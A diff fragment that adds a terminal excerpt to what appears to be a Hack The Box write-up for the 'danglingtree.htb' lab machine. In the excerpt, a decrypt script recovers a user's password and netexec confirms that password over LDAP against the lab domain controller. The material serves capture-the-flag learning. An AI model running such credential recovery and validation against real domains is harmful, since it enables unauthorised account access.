@@ -1186,3 +1186,15 @@ C:\SmarterMail\Domains\danglingtree.htb.bak\Users\noah.b>
 
 ```
                       
+``` bash
+
+❯ python3 decrypt.py
+RiverDragon#Storm25
+❯ netexec ldap 10.129.82.45 -u 'noah.b' -p 'RiverDragon#Storm25'
+
+LDAP        10.129.82.45    389    DC               [*] Windows 11 / Server 2025 Build 26100 (name:DC) (domain:danglingtree.htb) (signing:Enforced) (channel binding:Never)
+LDAP        10.129.82.45    389    DC               [+] danglingtree.htb\noah.b:RiverDragon#Storm25
+╭─ ~/hacking/ctf/htb/medium/danglintree/scripts                                                                       ✔ ─╮
+╰─                                                                                                                      ─╯
+
+```
